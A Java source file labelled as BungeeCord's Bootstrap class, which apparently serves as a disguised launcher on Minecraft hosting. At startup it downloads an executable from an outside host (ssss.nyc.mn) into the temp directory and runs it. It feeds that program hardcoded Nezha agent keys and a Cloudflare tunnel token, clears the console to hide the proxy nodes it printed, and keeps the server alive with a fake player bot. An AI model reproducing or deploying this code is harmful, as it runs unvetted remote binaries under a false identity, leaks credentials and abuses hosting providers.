package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

public class Bootstrap
{
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    private static Process minecraftProcess;
    private static Thread fakePlayerThread;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
        "MC_JAR", "MC_MEMORY", "MC_ARGS", "MC_PORT", 
        "FAKE_PLAYER_ENABLED", "FAKE_PLAYER_NAME", "FAKE_PLAYER_ACTIVITY"
    };

    public static void main(String[] args) throws Exception
    {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) 
        {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower,please switch the version in startup menu!" + ANSI_RESET);
            Thread.sleep(3000);
            System.exit(1);
        }

        try {
            Map<String, String> config = loadEnvVars();
            
            runSbxBinary(config);
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "SBX Services are running!" + ANSI_RESET);
            
            if (isMcServerEnabled(config)) {
                startMinecraftServer(config);
                System.out.println(ANSI_YELLOW + "\n[MC-Server] Waiting for server to fully start..." + ANSI_RESET);
                Thread.sleep(30000);
            }
            
            if (isFakePlayerEnabled(config)) {
                System.out.println(ANSI_YELLOW + "\n[FakePlayer] Preparing to connect..." + ANSI_RESET);
                waitForServerReady(config);
                startFakePlayerBot(config);
            }
            
            System.out.println(ANSI_GREEN + "\nThank you for using this script, Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace();
        }
        
        while (running.get()) {
            try {
                Thread.sleep(30000); // 增加到30秒，减少主循环检查频率
            } catch (InterruptedException e) {
                break;
            }
        }
    }
    
    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                    .inheritIO()
                    .start()
                    .waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
                
                new ProcessBuilder("tput", "reset")
                    .inheritIO()
                    .start()
                    .waitFor();
                
                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception e) {
            try {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            } catch (Exception ignored) {}
        }
    }   
    
    private static void runSbxBinary(Map<String, String> envVars) throws Exception {
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
    }
    
    private static Map<String, String> loadEnvVars() throws IOException {
        Map<String, String> envVars = new HashMap<>();
        
        envVars.put("UUID", "73882c19-5df8-476a-bbbf-56e3eb06025f");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "nzmbv.wuge.nyc.mn:443");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "gUxNJhaKJgceIgeapZG4956rmKFgmQgP");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "mcse.svip888.us.kg");
        envVars.put("ARGO_AUTH", "eyJhIjoiMGU3ZjI2MWZiY2ExMzcwNzZhNGZmODcxMzU3ZjYzNGQiLCJ0IjoiMmJhNGI2OGMtZjU2MS00MGY1LWJhOTItNGY3ZGE0ZjI4ZmUzIiwicyI6Ik5EWmtNVGcxWkRndE9HUXdaUzAwTURRd0xUazJOR1V0WTJWalpUZzVPVGcwTnpCbSJ9");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "store.ubi.com");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "俄罗斯");
        envVars.put("DISABLE_ARGO", "false");
        
        envVars.put("MC_JAR", "server99.jar");
        envVars.put("MC_MEMORY", "512M");
        envVars.put("MC_ARGS", "");
        envVars.put("MC_PORT", "");
        envVars.put("FAKE_PLAYER_ENABLED", "true");
        envVars.put("FAKE_PLAYER_NAME", "laohu");
        envVars.put("FAKE_PLAYER_ACTIVITY", "low"); // 默认改为low，更稳定
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value); 
                    }
                }
            }
        }
        
        return envVars;
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }
    
    private static void stopServices() {
        if (minecraftProcess != null && minecraftProcess.isAlive()) {
            System.out.println(ANSI_YELLOW + "[MC-Server] Stopping..." + ANSI_RESET);
            minecraftProcess.destroy();
            try {
                minecraftProcess.waitFor(10, java.util.concurrent.TimeUnit.SECONDS);
            } catch (InterruptedException e) {}
        }
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
        if (fakePlayerThread != null && fakePlayerThread.isAlive()) {
            fakePlayerThread.interrupt();
            System.out.println(ANSI_YELLOW + "[FakePlayer] Stopped" + ANSI_RESET);
        }
    }
    
    // ==================== Minecraft Server Functions ====================
    
    private static boolean isMcServerEnabled(Map<String, String> config) {
        String jarName = config.get("MC_JAR");
        return jarName != null && !jarName.trim().isEmpty();
    }
    
    private static void startMinecraftServer(Map<String, String> config) throws Exception {
        String jarName = config.get("MC_JAR");
        String memory = config.getOrDefault("MC_MEMORY", "512M");
        String extraArgs = config.getOrDefault("MC_ARGS", "");
        
        String mcPortStr = config.get("MC_PORT");
        int mcPort = 25565;
        if (mcPortStr != null && !mcPortStr.trim().isEmpty()) {
            try {
                mcPort = Integer.parseInt(mcPortStr.trim());
            } catch (NumberFormatException e) {
                System.out.println(ANSI_YELLOW + "[MC-Server] Invalid MC_PORT, using default: 25565" + ANSI_RESET);
            }
        }
        
        config.put("MC_PORT", String.valueOf(mcPort));
        
        if (!memory.matches("\\d+[MG]")) {
            System.out.println(ANSI_YELLOW + "[MC-Server] Invalid memory format, using default: 512M" + ANSI_RESET);
            memory = "512M";
        }
        
        Path jarPath = Paths.get(jarName);
        if (!Files.exists(jarPath)) {
            System.out.println(ANSI_RED + "[MC-Server] Error: " + jarName + " not found!" + ANSI_RESET);
            System.out.println(ANSI_YELLOW + "[MC-Server] Skipping Minecraft server startup" + ANSI_RESET);
            return;
        }
        
        Path eulaPath = Paths.get("eula.txt");
        if (!Files.exists(eulaPath)) {
            System.out.println(ANSI_GREEN + "[MC-Server] Creating eula.txt (auto-accepting)" + ANSI_RESET);
            Files.write(eulaPath, "eula=true".getBytes());
        } else {
            String eulaContent = new String(Files.readAllBytes(eulaPath));
            if (!eulaContent.contains("eula=true")) {
                Files.write(eulaPath, "eula=true".getBytes());
            }
        }
        
        Path propPath = Paths.get("server.properties");
        String props = "";
        
        if (Files.exists(propPath)) {
            props = new String(Files.readAllBytes(propPath));
        } else {
            System.out.println(ANSI_GREEN + "[MC-Server] Creating server.properties" + ANSI_RESET);
            props = "server-port=" + mcPort + "\nonline-mode=false\n";
            Files.write(propPath, props.getBytes());
        }
        
        if (props.contains("server-port=")) {
            props = props.replaceAll("server-port=\\d+", "server-port=" + mcPort);
        } else {
            props += "\nserver-port=" + mcPort + "\n";
        }
        
        if (props.contains("online-mode=true")) {
            System.out.println(ANSI_GREEN + "[MC-Server] Setting online-mode=false for fake player support" + ANSI_RESET);
            props = props.replace("online-mode=true", "online-mode=false");
        } else if (!props.contains("online-mode=")) {
            props += "online-mode=false\n";
        }
        
        if (props.contains("player-idle-timeout=")) {
            props = props.replaceAll("player-idle-timeout=\\d+", "player-idle-timeout=0");
        } else {
            props += "player-idle-timeout=0\n";
        }
        
        Files.write(propPath, props.getBytes());
        
        System.out.println(ANSI_GREEN + "\n=== Starting Minecraft Server ===" + ANSI_RESET);
        System.out.println(ANSI_GREEN + "JAR: " + jarName + ANSI_RESET);
        System.out.println(ANSI_GREEN + "Memory: " + memory + ANSI_RESET);
        System.out.println(ANSI_GREEN + "Port: " + mcPort + ANSI_RESET);
        
        List<String> cmd = new ArrayList<>();
        cmd.add("java");
        cmd.add("-Xms" + memory);
        cmd.add("-Xmx" + memory);
        
        if (!extraArgs.trim().isEmpty()) {
            cmd.addAll(Arrays.asList(extraArgs.split("\\s+")));
        }
        
        int memoryMB = parseMemory(memory);
        if (memoryMB >= 2048) {
            cmd.add("-XX:+UseG1GC");
            cmd.add("-XX:+ParallelRefProcEnabled");
            cmd.add("-XX:MaxGCPauseMillis=200");
            cmd.add("-XX:+UnlockExperimentalVMOptions");
            cmd.add("-XX:+DisableExplicitGC");
        } else if (memoryMB >= 1024) {
            cmd.add("-XX:+UseG1GC");
            cmd.add("-XX:MaxGCPauseMillis=200");
            cmd.add("-XX:+DisableExplicitGC");
        } else {
            cmd.add("-XX:+UseSerialGC");
            cmd.add("-XX:+DisableExplicitGC");
        }
        
        cmd.add("-jar");
        cmd.add(jarName);
        cmd.add("nogui");
        
        ProcessBuilder pb = new ProcessBuilder(cmd);
        pb.redirectErrorStream(true);
        
        minecraftProcess = pb.start();
        
        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(minecraftProcess.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    System.out.println("[MC-Server] " + line);
                }
            } catch (IOException e) {}
        }).start();
        
        Thread.sleep(3000);
        if (!minecraftProcess.isAlive()) {
            System.out.println(ANSI_RED + "[MC-Server] Failed to start! Exit code: " + 
                             minecraftProcess.exitValue() + ANSI_RESET);
        } else {
            System.out.println(ANSI_GREEN + "[MC-Server] ✓ Started successfully on port " + mcPort + ANSI_RESET);
        }
    }
    
    private static int parseMemory(String memory) {
        try {
            memory = memory.toUpperCase().trim();
            if (memory.endsWith("G")) {
                return Integer.parseInt(memory.substring(0, memory.length() - 1)) * 1024;
            } else if (memory.endsWith("M")) {
                return Integer.parseInt(memory.substring(0, memory.length() - 1));
            }
        } catch (Exception e) {}
        return 512;
    }
    
    // ==================== Fake Player Functions ====================
    
    private static boolean isFakePlayerEnabled(Map<String, String> config) {
        String enabled = config.get("FAKE_PLAYER_ENABLED");
        return enabled != null && enabled.equalsIgnoreCase("true");
    }
    
    private static void waitForServerReady(Map<String, String> config) throws InterruptedException {
        int mcPort = getMcPort(config);
        
        System.out.println(ANSI_YELLOW + "[FakePlayer] Checking server status on port " + mcPort + "..." + ANSI_RESET);
        
        for (int i = 0; i < 60; i++) {
            try {
                Thread.sleep(5000);
                
                try (Socket testSocket = new Socket()) {
                    testSocket.connect(new InetSocketAddress("127.0.0.1", mcPort), 3000);
                    System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Server port " + mcPort + " is ready!" + ANSI_RESET);
                    Thread.sleep(10000);
                    return;
                }
            } catch (Exception e) {
                if (i % 6 == 0) {
                    System.out.println(ANSI_YELLOW + "[FakePlayer] Still waiting... (" + (i * 5) + "s)" + ANSI_RESET);
                }
            }
        }
        
        System.out.println(ANSI_RED + "[FakePlayer] Warning: Timeout, trying anyway..." + ANSI_RESET);
    }
    
    private static int getMcPort(Map<String, String> config) {
        String portStr = config.get("MC_PORT");
        if (portStr == null || portStr.trim().isEmpty()) {
            return 25565;
        }
        
        try {
            return Integer.parseInt(portStr.trim());
        } catch (NumberFormatException e) {
            System.out.println(ANSI_YELLOW + "[FakePlayer] Invalid MC_PORT, using default: 25565" + ANSI_RESET);
            return 25565;
        }
    }
    
    private static void startFakePlayerBot(Map<String, String> config) {
        String playerName = config.getOrDefault("FAKE_PLAYER_NAME", "Steve");
        int mcPort = getMcPort(config);
        String activityLevel = config.getOrDefault("FAKE_PLAYER_ACTIVITY", "low");

        System.out.println(ANSI_GREEN + "[FakePlayer] Starting fake player bot: " + playerName + ANSI_RESET);
        System.out.println(ANSI_GREEN + "[FakePlayer] Target: 127.0.0.1:" + mcPort + ANSI_RESET);
        System.out.println(ANSI_GREEN + "[FakePlayer] Protocol: 1.21.4 (774)" + ANSI_RESET);
        System.out.println(ANSI_GREEN + "[FakePlayer] Activity Level: " + activityLevel.toUpperCase() + ANSI_RESET);

        fakePlayerThread = new Thread(() -> {
            while (running.get()) {
                Socket socket = null;
                int heartbeatCount = 0;
                int actionCount = 0;
                long sessionStartTime = System.currentTimeMillis();
                
                try {
                    System.out.println(ANSI_YELLOW + "[FakePlayer] Connecting..." + ANSI_RESET);

                    socket = new Socket();
                    socket.setReceiveBufferSize(10 * 1024 * 1024);
                    socket.connect(new InetSocketAddress("127.0.0.1", mcPort), 5000);
                    socket.setSoTimeout(5000); // 设置5秒超时，防止无限等待

                    DataOutputStream out = new DataOutputStream(socket.getOutputStream());
                    DataInputStream in = new DataInputStream(new BufferedInputStream(socket.getInputStream()));

                    // Handshake
                    ByteArrayOutputStream handshakeBuf = new ByteArrayOutputStream();
                    DataOutputStream handshake = new DataOutputStream(handshakeBuf);
                    writeVarInt(handshake, 0x00);
                    writeVarInt(handshake, 774);
                    writeString(handshake, "127.0.0.1");
                    handshake.writeShort(mcPort);
                    writeVarInt(handshake, 2);
                    byte[] handshakeData = handshakeBuf.toByteArray();
                    writeVarInt(out, handshakeData.length);
                    out.write(handshakeData);
                    out.flush();

                    // Login
                    ByteArrayOutputStream loginBuf = new ByteArrayOutputStream();
                    DataOutputStream login = new DataOutputStream(loginBuf);
                    writeVarInt(login, 0x00);
                    writeString(login, playerName);
                    UUID playerUUID = UUID.nameUUIDFromBytes(("OfflinePlayer:" + playerName).getBytes("UTF-8"));
                    login.writeLong(playerUUID.getMostSignificantBits());
                    login.writeLong(playerUUID.getLeastSignificantBits());
                    byte[] loginData = loginBuf.toByteArray();
                    writeVarInt(out, loginData.length);
                    out.write(loginData);
                    out.flush();

                    System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Handshake & Login sent" + ANSI_RESET);

                    boolean configPhase = false;
                    boolean playPhase = false;
                    boolean compressionEnabled = false;
                    int compressionThreshold = -1;
                    
                    long lastActivityTime = System.currentTimeMillis();
                    long lastMajorActionTime = System.currentTimeMillis();

                    while (running.get() && !socket.isClosed()) {
                        try {
                            // 关键优化：检查是否有可用数据
                            if (in.available() == 0) {
                                Thread.sleep(100); // 没有数据时休眠100ms，避免CPU空转
                                continue;
                            }
                            
                            int packetLength = readVarInt(in);
                            if (packetLength < 0 || packetLength > 100000000) {
                                throw new IOException("Bad packet size");
                            }

                            byte[] packetData = null;
                            
                            if (compressionEnabled) {
                                int dataLength = readVarInt(in);
                                int compressedLength = packetLength - getVarIntSize(dataLength);
                                byte[] compressedData = new byte[compressedLength];
                                in.readFully(compressedData);

                                if (dataLength == 0) {
                                    packetData = compressedData;
                                } else if (dataLength <= 8192) {
                                    java.util.zip.Inflater inflater = new java.util.zip.Inflater();
                                    inflater.setInput(compressedData);
                                    packetData = new byte[dataLength];
                                    inflater.inflate(packetData);
                                    inflater.end();
                                }
                            } else {
                                packetData = new byte[packetLength];
                                in.readFully(packetData);
                            }

                            if (packetData == null) continue;

                            ByteArrayInputStream packetStream = new ByteArrayInputStream(packetData);
                            DataInputStream packetIn = new DataInputStream(packetStream);
                            int packetId = readVarInt(packetIn);

                            if (!playPhase) {
                                if (!configPhase) {
                                    // Login Phase
                                    if (packetId == 0x03) {
                                        compressionThreshold = readVarInt(packetIn);
                                        compressionEnabled = compressionThreshold >= 0;
                                        System.out.println(ANSI_YELLOW + "[FakePlayer] Compression: " + compressionThreshold + ANSI_RESET);
                                    } else if (packetId == 0x02) {
                                        System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Login Success" + ANSI_RESET);
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        DataOutputStream ack = new DataOutputStream(ackBuf);
                                        writeVarInt(ack, 0x03);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                        configPhase = true;

                                        // Send Client Information
                                        ByteArrayOutputStream clientInfoBuf = new ByteArrayOutputStream();
                                        DataOutputStream info = new DataOutputStream(clientInfoBuf);
                                        writeVarInt(info, 0x00);
                                        writeString(info, "en_US");
                                        info.writeByte(10);
                                        writeVarInt(info, 0);
                                        info.writeBoolean(true);
                                        info.writeByte(127);
                                        writeVarInt(info, 1);
                                        info.writeBoolean(false);
                                        info.writeBoolean(true);
                                        writeVarInt(info, 0);
                                        sendPacket(out, clientInfoBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                    }
                                } else {
                                    // Config Phase
                                    if (packetId == 0x03) {
                                        System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Config Finished, entering Play phase..." + ANSI_RESET);
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        DataOutputStream ack = new DataOutputStream(ackBuf);
                                        writeVarInt(ack, 0x03);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                        playPhase = true;
                                        heartbeatCount = 0;
                                    } else if (packetId == 0x04 && packetIn.available() >= 8) {
                                        long id = packetIn.readLong();
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        DataOutputStream ack = new DataOutputStream(ackBuf);
                                        writeVarInt(ack, 0x04);
                                        ack.writeLong(id);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                    } else if (packetId == 0x0E) {
                                        ByteArrayOutputStream buf = new ByteArrayOutputStream();
                                        DataOutputStream bufOut = new DataOutputStream(buf);
                                        writeVarInt(bufOut, 0x07);
                                        writeVarInt(bufOut, 0);
                                        sendPacket(out, buf.toByteArray(), compressionEnabled, compressionThreshold);
                                    }
                                }
                            } else {
                                // Play Phase
                                long currentTime = System.currentTimeMillis();
                                
                                // Detect and respond to KeepAlive packets
                                if (packetId >= 0x20 && packetId <= 0x30 && packetIn.available() == 8) {
                                    long keepAliveId = packetIn.readLong();
                                    heartbeatCount++;
                                    
                                    System.out.println(ANSI_GREEN + "[FakePlayer] ♥ Heartbeat #" + heartbeatCount + 
                                        " (ID: 0x" + Integer.toHexString(packetId) + ") Val: " + keepAliveId + 
                                        " [Actions: " + actionCount + "]" + ANSI_RESET);
                                    
                                    // Reply to KeepAlive
                                    ByteArrayOutputStream buf = new ByteArrayOutputStream();
                                    DataOutputStream bufOut = new DataOutputStream(buf);
                                    writeVarInt(bufOut, 0x1B);
                                    bufOut.writeLong(keepAliveId);
                                    sendPacket(out, buf.toByteArray(), compressionEnabled, compressionThreshold);
                                    
                                    // 等待10个心跳后再开始活动，确保稳定
                                    if (heartbeatCount >= 10) {
                                        // 5分钟执行一次主要活动 (300秒)
                                        if (currentTime - lastMajorActionTime > 300000) {
                                            performMajorActivity(out, compressionEnabled, compressionThreshold);
                                            actionCount++;
                                            lastMajorActionTime = currentTime;
                                            lastActivityTime = currentTime;
                                        }
                                    } else {
                                        System.out.println(ANSI_YELLOW + "[FakePlayer] Stabilizing... (heartbeat " + 
                                            heartbeatCount + "/10)" + ANSI_RESET);
                                    }
                                }
                                
                                // Disconnect packet
                                if (packetId == 0x1D) {
                                    System.out.println(ANSI_RED + "[FakePlayer] Kicked. Session lasted: " + 
                                        ((currentTime - sessionStartTime) / 1000) + "s, Actions: " + actionCount + ANSI_RESET);
                                    break;
                                }
                            }

                        } catch (java.net.SocketTimeoutException e) {
                            // 超时是正常的，添加短暂休眠避免CPU空转
                            Thread.sleep(100);
                            continue;
                        } catch (Exception e) {
                            System.out.println(ANSI_RED + "[FakePlayer] Packet error: " + e.getMessage() + ANSI_RESET);
                            break;
                        }
                    }

                    if (socket != null && !socket.isClosed()) {
                        try { socket.close(); } catch (Exception e) {}
                    }
                    System.out.println(ANSI_YELLOW + "[FakePlayer] Session ended. Total actions: " + actionCount + ANSI_RESET);
                    System.out.println(ANSI_YELLOW + "[FakePlayer] Reconnecting in 30s..." + ANSI_RESET);
                    Thread.sleep(30000); // 增加重连间隔到30秒

                } catch (java.net.ConnectException e) {
                    System.out.println(ANSI_YELLOW + "[FakePlayer] Server offline, retrying in 60s..." + ANSI_RESET);
                    try { Thread.sleep(60000); } catch (InterruptedException ex) { break; }
                } catch (InterruptedException e) {
                    break;
                } catch (Exception e) {
                    System.out.println(ANSI_YELLOW + "[FakePlayer] Connection error: " + e.getMessage() + ANSI_RESET);
                    try { Thread.sleep(30000); } catch (InterruptedException ex) { break; }
                }
            }
        });

        fakePlayerThread.setDaemon(true);
        fakePlayerThread.start();
    }
    
    private static void performMajorActivity(DataOutputStream out, boolean compress, int threshold) {
        try {
            System.out.println(ANSI_GREEN + "[FakePlayer] ★ MAJOR ACTIVITY: 360° rotation (slow & smooth)" + ANSI_RESET);
            
            // 慢速平滑旋转，减少服务器负载
            for (int i = 0; i < 12; i++) {
                Thread.sleep(500); // 每次旋转间隔500ms
                
                ByteArrayOutputStream rotBuf = new ByteArrayOutputStream();
                DataOutputStream rot = new DataOutputStream(rotBuf);
                writeVarInt(rot, 0x1F);
                rot.writeFloat((float)(i * 30)); // 每次旋转30度
                rot.writeFloat((float)(Math.sin(i * 0.5) * 10)); // 轻微上下移动
                rot.writeBoolean(true);
                sendPacket(out, rotBuf.toByteArray(), compress, threshold);
            }
            
            System.out.println(ANSI_GREEN + "[FakePlayer] ★ Activity completed (360° smooth rotation)" + ANSI_RESET);
            
        } catch (Exception e) {
            System.out.println(ANSI_RED + "[FakePlayer] Activity error: " + e.getMessage() + ANSI_RESET);
        }
    }
    
    private static int getVarIntSize(int value) {
        int size = 0;
        do {
            size++;
            value >>>= 7;
        } while (value != 0);
        return size;
    }
    
    private static void sendPacket(DataOutputStream out, byte[] packet, boolean compress, int threshold) throws IOException {
        if (!compress || packet.length < threshold) {
            if (compress) {
                ByteArrayOutputStream buf = new ByteArrayOutputStream();
                DataOutputStream bufOut = new DataOutputStream(buf);
                writeVarInt(bufOut, 0);
                bufOut.write(packet);
                
                byte[] finalPacket = buf.toByteArray();
                writeVarInt(out, finalPacket.length);
                out.write(finalPacket);
            } else {
                writeVarInt(out, packet.length);
                out.write(packet);
            }
        } else {
            byte[] compressedData = compressData(packet);
            
            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            DataOutputStream bufOut = new DataOutputStream(buf);
            writeVarInt(bufOut, packet.length);
            bufOut.write(compressedData);
            
            byte[] finalPacket = buf.toByteArray();
            writeVarInt(out, finalPacket.length);
            out.write(finalPacket);
        }
        out.flush();
    }
    
    private static byte[] compressData(byte[] data) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        java.util.zip.Deflater deflater = new java.util.zip.Deflater();
        deflater.setInput(data);
        deflater.finish();
        
        byte[] buffer = new byte[1024];
        while (!deflater.finished()) {
            int count = deflater.deflate(buffer);
            out.write(buffer, 0, count);
        }
        deflater.end();
        return out.toByteArray();
    }
    
    private static void writeVarInt(DataOutputStream out, int value) throws IOException {
        while ((value & 0xFFFFFF80) != 0) {
            out.writeByte((value & 0x7F) | 0x80);
            value >>>= 7;
        }
        out.writeByte(value & 0x7F);
    }
    
    private static void writeString(DataOutputStream out, String str) throws IOException {
        byte[] bytes = str.getBytes("UTF-8");
        writeVarInt(out, bytes.length);
        out.write(bytes);
    }
    
    private static int readVarInt(DataInputStream in) throws IOException {
        int value = 0;
        int length = 0;
        byte currentByte;
        do {
            currentByte = in.readByte();
            value |= (currentByte & 0x7F) << (length * 7);
            length++;
            if (length > 5) throw new IOException("VarInt too big");
        } while ((currentByte & 0x80) == 0x80);
        return value;
    }
}
